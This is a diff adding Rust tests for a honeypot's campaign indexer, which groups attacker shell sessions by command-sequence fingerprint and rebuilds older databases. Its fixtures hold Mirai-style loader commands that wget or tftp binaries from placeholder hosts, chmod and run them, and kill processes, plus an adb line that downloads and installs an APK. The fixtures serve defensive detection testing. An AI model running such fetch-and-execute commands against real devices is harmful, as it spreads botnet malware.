@@ -675,6 +675,494 @@ async fn a_download_joins_the_sample_campaign_once_the_fetch_lands(pool: PgPool)
     assert_eq!(of_kind(&memberships(&pool).await, "sample")[0].len(), 3);
 }
 
+// ---- the command-sequence fingerprint: what makes sessions the same tool ----
+
+/// The shell-entry lines a telnet loader sends first; they are the target's login flow.
+const ENTRY: [&str; 4] = ["enable", "system", "shell", "sh"];
+
+/// A Mirai-family echo loader: sixteen distinct commands (`<esc>` payloads and addresses vary per
+/// session in the real thing, and are normalized away).
+const MIRAI: [&str; 16] = [
+    ">/var/run/.x&&cd /var/run;>/tmp/.x&&cd /tmp;>/dev/.x&&cd /dev",
+    "/bin/busybox ZXCVB",
+    "/bin/busybox cat /proc/mounts",
+    "/bin/busybox ls /dev",
+    "/bin/busybox wget http://192.0.2.7/bins/x86 -O .x",
+    "/bin/busybox echo -ne '\\x7f\\x45\\x4c\\x46' > .x",
+    "/bin/busybox echo -ne '\\x01\\x01\\x01' >> .x",
+    "/bin/busybox chmod 777 .x",
+    "./.x telnet.loader",
+    "rm -f .x",
+    "/bin/busybox ps",
+    "/bin/busybox kill -9 1",
+    "/bin/busybox uname -m",
+    "/bin/busybox id",
+    "/bin/busybox df",
+    "/bin/busybox free",
+];
+
+async fn session_of(pool: &PgPool, ip: &str, sensor: &str, start: DateTime<Utc>, cmds: &[&str]) {
+    let session = Uuid::now_v7();
+    for (i, c) in cmds.iter().enumerate() {
+        command(
+            pool,
+            ip,
+            sensor,
+            start + Duration::seconds(2 * i as i64),
+            session,
+            c,
+        )
+        .await;
+    }
+}
+
+/// Later traffic on each sensor moves its clock past every session's idle gap.
+async fn end_runs(pool: &PgPool, sensors: &[&str]) {
+    for sensor in sensors {
+        command(
+            pool,
+            "192.0.2.99",
+            sensor,
+            t0() + Duration::hours(6),
+            Uuid::now_v7(),
+            "id",
+        )
+        .await;
+    }
+}
+
+/// `(label, member count)` of every command-sequence campaign, largest first.
+async fn sequences(pool: &PgPool) -> Vec<(String, i32)> {
+    sqlx::query_as(
+        "SELECT label, member_count FROM campaign WHERE kind = 'command_sequence' \
+         ORDER BY member_count DESC, label",
+    )
+    .fetch_all(pool)
+    .await
+    .unwrap()
+}
+
+/// The owner's live console, 2026-10-08: one Mirai-family loader showed as dozens of campaigns,
+/// "1 commands: ...", "2 commands: ..." and on, because sessions stop at different points. Sessions
+/// cut at 4 to 16 commands are one campaign; the ones cut shorter have the opening they have, so
+/// the loader is `KEY_SHAPES` campaigns, not sixteen.
+#[sqlx::test(migrations = false)]
+async fn a_loader_stopped_at_any_point_after_its_opening_is_one_campaign(pool: PgPool) {
+    migrate(&pool).await;
+    let key = review::campaign::fingerprint::KEY_SHAPES as usize;
+    for cut in 1..=MIRAI.len() {
+        let ip = format!("192.0.2.{}", 20 + cut);
+        // Half the sessions come in through the shell-entry lines, half do not.
+        let mut cmds: Vec<&str> = if cut % 2 == 0 { ENTRY.to_vec() } else { vec![] };
+        cmds.extend(&MIRAI[..cut]);
+        session_of(
+            &pool,
+            &ip,
+            "telnet",
+            t0() + Duration::minutes(cut as i64),
+            &cmds,
+        )
+        .await;
+    }
+    end_runs(&pool, &["telnet"]).await;
+    index_all(&pool).await;
+
+    let found = sequences(&pool).await;
+    assert_eq!(found.len(), key, "{found:?}");
+    let opening = ">/var/run/.x&&cd /var/run;>/tmp/.x&&cd /tmp;>/dev/.x&&cd /dev \
+                   ; /bin/busybox ZXCVB ; /bin/busybox cat /proc/mounts";
+    // The sessions that came in through the four entry lines count them: the odd cut 5 is the
+    // shortest run (5 shapes), the even cut 16 the longest (4 entry lines and 16 commands).
+    assert_eq!(
+        found[0],
+        (format!("5-20 commands: {opening}"), (16 - key + 1) as i32)
+    );
+    // Each shorter cut is its own campaign, labeled with the opening it has (the count includes
+    // the entry lines the even cuts came in through).
+    let mut shorter: Vec<String> = found[1..]
+        .iter()
+        .map(|(l, n)| {
+            assert_eq!(*n, 1);
+            l.split_once(": ").unwrap().1.to_string()
+        })
+        .collect();
+    shorter.sort_by_key(String::len);
+    let first = &opening[..opening.find(" ;").unwrap()];
+    let second = &opening[..opening.rfind(" ; ").unwrap()];
+    assert_eq!(shorter, vec![first, second, opening]);
+}
+
+/// Two loaders that share their first commands are different tools once they diverge inside the
+/// key, and the same tool when they diverge after it. Short numbers are part of the tool: an
+/// architecture is not a random token.
+#[sqlx::test(migrations = false)]
+async fn loaders_that_differ_inside_the_key_do_not_merge(pool: PgPool) {
+    migrate(&pool).await;
+    // X and Y share three commands and diverge at the fourth; Z shares only the first.
+    let x: Vec<&str> = MIRAI[..8].to_vec();
+    let mut y: Vec<&str> = MIRAI[..8].to_vec();
+    y[3] = "/bin/busybox ls /tmp";
+    let mut z: Vec<&str> = MIRAI[..8].to_vec();
+    z[1..].fill("/bin/busybox tftp -g -l .x -r x86 192.0.2.8");
+    z[2] = "/bin/busybox tftp -g -l .y -r arm7 192.0.2.8";
+    // W matches X for the whole key and then goes its own way: the same campaign as X.
+    let mut w: Vec<&str> = MIRAI[..8].to_vec();
+    w[5] = "/bin/busybox echo done";
+    // Architecture names are tool vocabulary: x86 and arm7 loaders are two campaigns.
+    let arch = |a: &str| format!("/bin/busybox wget http://192.0.2.9/bins.sh/{a}");
+    let (a86, a7) = (arch("x86"), arch("arm7"));
+    let on_x86: Vec<&str> = vec!["uname -m", "cd /tmp", a86.as_str(), "chmod 777 bins.sh"];
+    let on_arm: Vec<&str> = vec!["uname -m", "cd /tmp", a7.as_str(), "chmod 777 bins.sh"];
+
+    for (i, cmds) in [&x, &y, &z, &w, &on_x86, &on_arm].iter().enumerate() {
+        for host in 0..3 {
+            session_of(
+                &pool,
+                &format!("198.51.100.{}", 10 * i + host + 1),
+                "telnet",
+                t0() + Duration::minutes((10 * i + host) as i64),
+                cmds,
+            )
+            .await;
+        }
+    }
+    end_runs(&pool, &["telnet"]).await;
+    index_all(&pool).await;
+    let found = sequences(&pool).await;
+    let counts: Vec<i32> = found.iter().map(|(_, n)| *n).collect();
+    // X and W together, then Y, Z, x86 and arm7 alone.
+    assert_eq!(counts, vec![6, 3, 3, 3, 3], "{found:?}");
+}
+
+/// The owner saw `echo P155084A ; id ; echo $(( 155084 + 1 ))` as about twenty one-host campaigns,
+/// and `N=49482a1671; ...` as one per host: only a random token differed.
+#[sqlx::test(migrations = false)]
+async fn per_session_random_tokens_do_not_split_a_campaign(pool: PgPool) {
+    migrate(&pool).await;
+    let mut rng = Rng(0x5eed_0001);
+    for i in 0..20u64 {
+        let n = 100_000 + rng.below(800_000);
+        let ip = format!("192.0.2.{}", i + 1);
+        session_of(
+            &pool,
+            &ip,
+            "telnet",
+            t0() + Duration::minutes(i as i64),
+            &[
+                &format!("echo P{n}A"),
+                "id",
+                &format!("echo $(( {n} + 1 ))"),
+            ],
+        )
+        .await;
+    }
+    for i in 0..10u64 {
+        let tag = format!("{:010x}", rng.next() & 0xff_ffff_ffff | 0xa00_0000);
+        let host = format!("203.0.113.{}", i + 1);
+        session_of(
+            &pool,
+            &format!("198.51.100.{}", i + 1),
+            "adb",
+            t0() + Duration::minutes(i as i64),
+            &[&format!(
+                "N={tag}; cd /data/local/tmp; U=http://{host}/gms.apk; wget $U -O $N; pm install $N"
+            )],
+        )
+        .await;
+    }
+    // A marker with a short number is a different thing: P12A and P34A are not random per session.
+    for (i, n) in ["12", "34"].iter().enumerate() {
+        session_of(
+            &pool,
+            &format!("203.0.113.{}", 100 + i),
+            "telnet",
+            t0(),
+            &[
+                &format!("echo P{n}A"),
+                "id",
+                &format!("echo $(( {n} + 1 ))"),
+            ],
+        )
+        .await;
+    }
+    end_runs(&pool, &["telnet", "adb"]).await;
+    index_all(&pool).await;
+    let found = sequences(&pool).await;
+    let counts: Vec<i32> = found.iter().map(|(_, n)| *n).collect();
+    assert_eq!(counts, vec![20, 10, 1, 1], "{found:?}");
+}
+
+/// HTTP request lines sent to a shell port, in any order, are one campaign of their own, not one
+/// per header permutation and not a shell tool.
+#[sqlx::test(migrations = false)]
+async fn http_requests_on_a_shell_port_are_one_campaign(pool: PgPool) {
+    migrate(&pool).await;
+    let headers = [
+        "User-Agent: Go-http-client/1.1",
+        "Accept: application/json",
+        "Node-Red-Api-Version: v2",
+        "Accept-Encoding: gzip",
+        "Host: 192.0.2.5:23",
+    ];
+    for i in 0..6usize {
+        let mut order: Vec<&str> = headers.to_vec();
+        order.rotate_left(i % headers.len());
+        if i >= 3 {
+            order.truncate(3);
+        }
+        if i == 5 {
+            order.insert(0, "GET /api/flows HTTP/1.1");
+        }
+        session_of(
+            &pool,
+            &format!("192.0.2.{}", i + 1),
+            "telnet",
+            t0() + Duration::minutes(i as i64),
+            &order,
+        )
+        .await;
+    }
+    session_of(&pool, "192.0.2.50", "telnet", t0(), &MIRAI[..6]).await;
+    end_runs(&pool, &["telnet"]).await;
+    index_all(&pool).await;
+    let found = sequences(&pool).await;
+    assert_eq!(found.len(), 2, "{found:?}");
+    assert_eq!(found[0].1, 6);
+    assert!(
+        found[0]
+            .0
+            .ends_with("commands: http request sent to a shell port"),
+        "{found:?}"
+    );
+    assert!(found[1].0.starts_with("6 commands: >/var/run"), "{found:?}");
+}
+
+/// `start ; enable ; config terminal` and its longer forms are a login that went nowhere: one
+/// campaign, whatever number of entry lines the bot sent.
+#[sqlx::test(migrations = false)]
+async fn runs_of_shell_entry_lines_only_are_one_campaign(pool: PgPool) {
+    migrate(&pool).await;
+    let entry = [
+        "start",
+        "enable",
+        "config terminal",
+        "system",
+        "linuxshell",
+        "shell",
+        "su",
+        "sh",
+    ];
+    for cut in 3..=entry.len() {
+        session_of(
+            &pool,
+            &format!("192.0.2.{cut}"),
+            "telnet",
+            t0() + Duration::minutes(cut as i64),
+            &entry[..cut],
+        )
+        .await;
+    }
+    end_runs(&pool, &["telnet"]).await;
+    index_all(&pool).await;
+    assert_eq!(
+        sequences(&pool).await,
+        vec![("3-8 commands: shell entry only".to_string(), 6)]
+    );
+}
+
+// ---- rebuilding what an older fingerprint wrote ----
+
+async fn non_command_rows(pool: &PgPool) -> Vec<String> {
+    sqlx::query_scalar(
+        "SELECT concat_ws('|', id, kind, key, label, representative::text, rep_event_id, \
+                first_seen, last_seen, member_count, sightings, self_propagating) \
+         FROM campaign WHERE kind <> 'command_sequence' ORDER BY id",
+    )
+    .fetch_all(pool)
+    .await
+    .unwrap()
+}
+
+/// A database indexed by the whole-run fingerprint is converted by the next indexing batches:
+/// the old command-sequence campaigns and sessions go, the new ones are built from the ledger,
+/// sample and scanner campaigns and indicators are not touched or double counted, and operator
+/// decisions on the review queue stay.
+#[sqlx::test(migrations = false)]
+async fn a_database_built_with_the_old_fingerprint_is_rebuilt_in_place(pool: PgPool) {
+    migrate(&pool).await;
+    // A worm sample uploaded from two hosts, a scanner, a loader cut at different points, and a
+    // download URL, so the rebuild has sample, scanner and indicator state to leave alone.
+    let worm = sha_hex(b"rebuild worm");
+    upload(&pool, "192.0.2.1", t0(), &worm, None).await;
+    upload(&pool, "192.0.2.2", t0() + Duration::minutes(1), &worm, None).await;
+    for (i, s) in ["catchall", "mssql", "adb"].iter().enumerate() {
+        append(
+            &pool,
+            "198.51.100.77",
+            s,
+            SignalType::CatchallProbe,
+            t0() + Duration::minutes(i as i64),
+            json!({}),
+            None,
+        )
+        .await;
+    }
+    for cut in [2usize, 5, 9, 16] {
+        let ip = format!("203.0.113.{cut}");
+        let session = Uuid::now_v7();
+        for (i, c) in MIRAI[..cut].iter().enumerate() {
+            command(
+                &pool,
+                &ip,
+                "telnet",
+                t0() + Duration::seconds(i as i64),
+                session,
+                c,
+            )
+            .await;
+        }
+        // The same session uploads a sample, which links to the loader's campaign.
+        upload(
+            &pool,
+            &ip,
+            t0() + Duration::seconds(30),
+            &sha_hex(format!("loader body {cut}").as_bytes()),
+            Some(session),
+        )
+        .await;
+    }
+    end_runs(&pool, &["telnet"]).await;
+    index_all(&pool).await;
+    let expected_sequences = sequences(&pool).await;
+    assert!(!expected_sequences.is_empty());
+    let before = non_command_rows(&pool).await;
+    let expected_links: Vec<(String, String)> = sqlx::query_as(
+        "SELECT c.label, s.sha256 FROM campaign_sample s JOIN campaign c ON c.id = s.campaign_id \
+         WHERE c.kind = 'command_sequence' ORDER BY 1, 2",
+    )
+    .fetch_all(&pool)
+    .await
+    .unwrap();
+    assert!(!expected_links.is_empty());
+    let iocs_before: i64 = sqlx::query_scalar("SELECT count(*) FROM ioc")
+        .fetch_one(&pool)
+        .await
+        .unwrap();
+
+    // The operator's decisions: on review_queue, which no campaign table references.
+    sqlx::query(
+        "INSERT INTO review_queue (source_ip, score_at_surface, categories_at_surface, state) \
+         VALUES ('203.0.113.16', 60, '{}'::jsonb, 'approved'), \
+                ('203.0.113.9', 60, '{}'::jsonb, 'pending')",
+    )
+    .execute(&pool)
+    .await
+    .unwrap();
+
+    // Put the database back in the state the previous build left: version 1 keys that no event
+    // produces, a session row with a version 1 digest, and the cursor at the end of the ledger.
+    sqlx::query("UPDATE campaign SET key = 'v1-' || key WHERE kind = 'command_sequence'")
+        .execute(&pool)
+        .await
+        .unwrap();
+    sqlx::query("UPDATE campaign_session SET chain = decode(repeat('ab', 32), 'hex')")
+        .execute(&pool)
+        .await
+        .unwrap();
+    sqlx::query("UPDATE campaign_cursor SET fingerprint_version = 1")
+        .execute(&pool)
+        .await
+        .unwrap();
+    let ledger_end: i64 = sqlx::query_scalar("SELECT max(id) FROM event")
+        .fetch_one(&pool)
+        .await
+        .unwrap();
+
+    // One small batch starts the rebuild: the cursor goes back and remembers where it was.
+    let first = campaign::index_batch(&pool, 5).await.unwrap();
+    assert_eq!(first, BatchOutcome::Indexed(5));
+    let (cursor, until, version): (i64, Option<i64>, i32) = sqlx::query_as(
+        "SELECT last_event_id, rebuild_until, fingerprint_version FROM campaign_cursor",
+    )
+    .fetch_one(&pool)
+    .await
+    .unwrap();
+    assert_eq!(
+        (until, version),
+        (Some(ledger_end), campaign::FINGERPRINT_VERSION)
+    );
+    assert!(cursor < ledger_end);
+    assert!(
+        of_kind(&memberships(&pool).await, "command_sequence").len() < expected_sequences.len(),
+        "the old campaigns are gone while the new ones are rebuilt"
+    );
+    assert_eq!(non_command_rows(&pool).await, before, "mid-rebuild");
+
+    index_all(&pool).await;
+    assert_eq!(sequences(&pool).await, expected_sequences);
+    assert_eq!(non_command_rows(&pool).await, before, "after the rebuild");
+    let links: Vec<(String, String)> = sqlx::query_as(
+        "SELECT c.label, s.sha256 FROM campaign_sample s JOIN campaign c ON c.id = s.campaign_id \
+         WHERE c.kind = 'command_sequence' ORDER BY 1, 2",
+    )
+    .fetch_all(&pool)
+    .await
+    .unwrap();
+    assert_eq!(links, expected_links);
+    let iocs_after: i64 = sqlx::query_scalar("SELECT count(*) FROM ioc")
+        .fetch_one(&pool)
+        .await
+        .unwrap();
+    assert_eq!(iocs_after, iocs_before);
+    let (cursor, until): (i64, Option<i64>) =
+        sqlx::query_as("SELECT last_event_id, rebuild_until FROM campaign_cursor")
+            .fetch_one(&pool)
+            .await
+            .unwrap();
+    assert_eq!((cursor, until), (ledger_end, None));
+    let decisions: Vec<(String, String)> =
+        sqlx::query_as("SELECT host(source_ip), state::text FROM review_queue ORDER BY 1")
+            .fetch_all(&pool)
+            .await
+            .unwrap();
+    assert_eq!(
+        decisions,
+        vec![
+            ("203.0.113.16".to_string(), "approved".to_string()),
+            ("203.0.113.9".to_string(), "pending".to_string()),
+        ]
+    );
+
+    // And it happens once: the next batches find nothing to do.
+    assert_eq!(
+        campaign::index_batch(&pool, 100).await.unwrap(),
+        BatchOutcome::Indexed(0)
+    );
+    assert_eq!(sequences(&pool).await, expected_sequences);
+}
+
+/// A new database has nothing to rebuild and is marked current at once.
+#[sqlx::test(migrations = false)]
+async fn a_new_database_is_current_without_a_rebuild(pool: PgPool) {
+    migrate(&pool).await;
+    let (version, until): (i32, Option<i64>) =
+        sqlx::query_as("SELECT fingerprint_version, rebuild_until FROM campaign_cursor")
+            .fetch_one(&pool)
+            .await
+            .unwrap();
+    assert_eq!((version, until), (1, None));
+    assert_eq!(
+        campaign::index_batch(&pool, 10).await.unwrap(),
+        BatchOutcome::Indexed(0)
+    );
+    let (version, until): (i32, Option<i64>) =
+        sqlx::query_as("SELECT fingerprint_version, rebuild_until FROM campaign_cursor")
+            .fetch_one(&pool)
+            .await
+            .unwrap();
+    assert_eq!((version, until), (campaign::FINGERPRINT_VERSION, None));
+}
+
 // ---- incremental versus one pass ----
 
 /// xorshift64*: a deterministic generator, so every case is reproducible from its seed.
@@ -816,7 +1304,8 @@ async fn snapshot(pool: &PgPool) -> BTreeMap<&'static str, Vec<String>> {
         (
             "campaign",
             "SELECT concat_ws('|', kind, key, label, representative::text, rep_event_id, \
-                first_seen, last_seen, member_count, sightings, self_propagating) FROM campaign",
+                first_seen, last_seen, member_count, sightings, self_propagating, \
+                min_shapes, max_shapes) FROM campaign",
         ),
         (
             "member",
@@ -843,7 +1332,8 @@ async fn snapshot(pool: &PgPool) -> BTreeMap<&'static str, Vec<String>> {
             "session",
             "SELECT concat_ws('|', session_id, host(source_ip), sensor, run, first_seen, \
                 last_seen, first_event_id, last_event_id, shapes, shape_chars, encode(last_shape, 'hex'), \
-                encode(chain, 'hex'), campaign_key, closed, pending_samples::text) FROM campaign_session",
+                encode(chain, 'hex'), payload, campaign_key, closed, pending_samples::text) \
+                FROM campaign_session",
         ),
         (
             "watermark",
@@ -935,6 +1425,118 @@ async fn ledger_oracle(pool: &PgPool) -> (BTreeSet<(String, String)>, BTreeSet<(
     (samples.into_iter().collect(), scanners)
 }
 
+/// One probe per sensor, from an address of its own, two hours after `at`: every sensor's clock
+/// passes the sweep gap, so runs still open when the generator stopped are grouped and the
+/// ledger oracle (which has no open runs) can be compared with.
+async fn quiet_hours_later(pool: &PgPool, at: DateTime<Utc>) {
+    for (i, sensor) in SENSORS.iter().enumerate() {
+        append(
+            pool,
+            &format!("192.0.2.{}", 240 + i),
+            sensor,
+            SignalType::CatchallProbe,
+            at + Duration::hours(2),
+            json!({}),
+            None,
+        )
+        .await;
+    }
+}
+
+/// `(members, fewest shapes, most shapes)` per command-sequence campaign, from the stored rows.
+async fn command_groups_in_db(pool: &PgPool) -> BTreeSet<(Vec<String>, i32, i32)> {
+    let rows: Vec<(Vec<String>, i32, i32)> = sqlx::query_as(
+        "SELECT array_agg(host(m.source_ip) ORDER BY host(m.source_ip)), c.min_shapes, c.max_shapes \
+         FROM campaign c JOIN campaign_member m ON m.campaign_id = c.id \
+         WHERE c.kind = 'command_sequence' GROUP BY c.id, c.min_shapes, c.max_shapes",
+    )
+    .fetch_all(pool)
+    .await
+    .unwrap();
+    rows.into_iter().collect()
+}
+
+/// The command-sequence campaigns recomputed from the ledger by a different method: a walk over
+/// the command events in id order that splits each session into runs at idle gaps, collapses
+/// repeats, and groups runs by the tuple of their opening commands, with no hashing and no stored
+/// state. Valid for ledgers whose sensor clocks move with the events, as the generator's do, where
+/// the indexer's sweep of quiet runs cannot end a run the session would have continued.
+async fn command_oracle_groups(pool: &PgPool) -> BTreeSet<(Vec<String>, i32, i32)> {
+    use review::campaign::fingerprint::{KEY_SHAPES, is_entry, is_http_request, normalize};
+    let rows: Vec<(String, String, DateTime<Utc>, Value)> = sqlx::query_as(
+        "SELECT host(source_ip), session_id::text, observed_at, metadata FROM event \
+         WHERE signal_type = 'honeypot_command_exec' AND session_id IS NOT NULL ORDER BY id",
+    )
+    .fetch_all(pool)
+    .await
+    .unwrap();
+    struct Run {
+        ip: String,
+        shapes: Vec<String>,
+        last: DateTime<Utc>,
+    }
+    let mut open: BTreeMap<String, Run> = BTreeMap::new();
+    let mut done: Vec<Run> = Vec::new();
+    for (ip, session, at, metadata) in rows {
+        if metadata.get("flood").is_some() || metadata.get("command_summary").is_some() {
+            continue;
+        }
+        let Some(command) = metadata.get("command").and_then(Value::as_str) else {
+            continue;
+        };
+        let shape = normalize(command);
+        if shape.is_empty() {
+            continue;
+        }
+        if open
+            .get(&session)
+            .is_some_and(|r| (at - r.last).num_seconds() > campaign::SESSION_IDLE_SECS)
+            && let Some(ended) = open.remove(&session)
+        {
+            done.push(ended);
+        }
+        let run = open.entry(session).or_insert_with(|| Run {
+            ip,
+            shapes: Vec::new(),
+            last: at,
+        });
+        run.last = run.last.max(at);
+        if run.shapes.last() != Some(&shape) {
+            run.shapes.push(shape);
+        }
+    }
+    done.extend(open.into_values());
+    let mut groups: BTreeMap<Vec<String>, (BTreeSet<String>, i32, i32)> = BTreeMap::new();
+    for run in done {
+        if run.shapes.iter().map(|s| s.chars().count()).sum::<usize>()
+            < campaign::MIN_RUN_CHARS as usize
+        {
+            continue;
+        }
+        let payload: Vec<&String> = run.shapes.iter().filter(|s| !is_entry(s)).collect();
+        let opening: Vec<String> = match payload.first() {
+            None => vec!["<entry only>".to_string()],
+            Some(first) if is_http_request(first) => vec!["<http>".to_string()],
+            Some(_) => payload
+                .iter()
+                .take(KEY_SHAPES as usize)
+                .map(|s| s.to_string())
+                .collect(),
+        };
+        let n = run.shapes.len() as i32;
+        let entry = groups
+            .entry(opening)
+            .or_insert_with(|| (BTreeSet::new(), n, n));
+        entry.0.insert(run.ip);
+        entry.1 = entry.1.min(n);
+        entry.2 = entry.2.max(n);
+    }
+    groups
+        .into_values()
+        .map(|(ips, fewest, most)| (ips.into_iter().collect(), fewest, most))
+        .collect()
+}
+
 #[sqlx::test(migrations = false)]
 async fn incremental_indexing_equals_one_pass_over_the_same_ledger(pool: PgPool) {
     migrate(&pool).await;
@@ -958,6 +1560,8 @@ async fn incremental_indexing_equals_one_pass_over_the_same_ledger(pool: PgPool)
                     .unwrap();
             }
         }
+        quiet_hours_later(&pool, at).await;
+        at += Duration::hours(3);
         while campaign::index_batch(&pool, 1 + rng.below(25) as i64)
             .await
             .unwrap()
@@ -1000,6 +1604,16 @@ async fn incremental_indexing_equals_one_pass_over_the_same_ledger(pool: PgPool)
             miscounted, 0,
             "seed {seed}: member_count against the member rows"
         );
+        let from_ledger = command_oracle_groups(&pool).await;
+        assert!(
+            !from_ledger.is_empty(),
+            "seed {seed}: the generator produced no command-sequence campaign"
+        );
+        assert_eq!(
+            from_ledger,
+            command_groups_in_db(&pool).await,
+            "seed {seed}: command-sequence campaigns against the ledger"
+        );
 
         reset_index(&pool).await;
         let ledger: i64 = sqlx::query_scalar("SELECT count(*) FROM event")
@@ -1014,6 +1628,59 @@ async fn incremental_indexing_equals_one_pass_over_the_same_ledger(pool: PgPool)
         for (table, rows) in &incremental {
             assert_eq!(rows, &one_pass[table], "seed {seed}: table {table} differs");
         }
+
+        // A database the previous fingerprint built, converted while the ledger keeps growing:
+        // the old command-sequence state is replaced, events that arrive mid-rebuild are indexed
+        // by the ordinary rules, and the result is what one pass over everything gives.
+        sqlx::query("UPDATE campaign SET key = 'v1-' || key WHERE kind = 'command_sequence'")
+            .execute(&pool)
+            .await
+            .unwrap();
+        sqlx::query(
+            "UPDATE campaign_session SET chain = decode(repeat('ab', 32), 'hex'), payload = 0",
+        )
+        .execute(&pool)
+        .await
+        .unwrap();
+        sqlx::query("UPDATE campaign_cursor SET fingerprint_version = 1")
+            .execute(&pool)
+            .await
+            .unwrap();
+        for _ in 0..3 {
+            campaign::index_batch(&pool, 1 + rng.below(25) as i64)
+                .await
+                .unwrap();
+        }
+        for _ in 0..30 {
+            at += Duration::seconds(rng.below(90) as i64);
+            generated_event(&pool, &mut rng, at, &mut sessions).await;
+            if rng.below(5) == 0 {
+                campaign::index_batch(&pool, 1 + rng.below(25) as i64)
+                    .await
+                    .unwrap();
+            }
+        }
+        quiet_hours_later(&pool, at).await;
+        while campaign::index_batch(&pool, 1 + rng.below(25) as i64)
+            .await
+            .unwrap()
+            != BatchOutcome::Indexed(0)
+        {}
+        let rebuilt = snapshot(&pool).await;
+        reset_index(&pool).await;
+        campaign::index_batch(&pool, 1_000_000).await.unwrap();
+        let grown = snapshot(&pool).await;
+        for (table, rows) in &rebuilt {
+            assert_eq!(
+                rows, &grown[table],
+                "seed {seed}: rebuilt table {table} differs"
+            );
+        }
+        assert_eq!(
+            command_oracle_groups(&pool).await,
+            command_groups_in_db(&pool).await,
+            "seed {seed}: command-sequence campaigns against the ledger, after the rebuild"
+        );
         assert!(
             !incremental["campaign"].is_empty() && !incremental["session"].is_empty(),
             "seed {seed}: the generator produced nothing to compare"
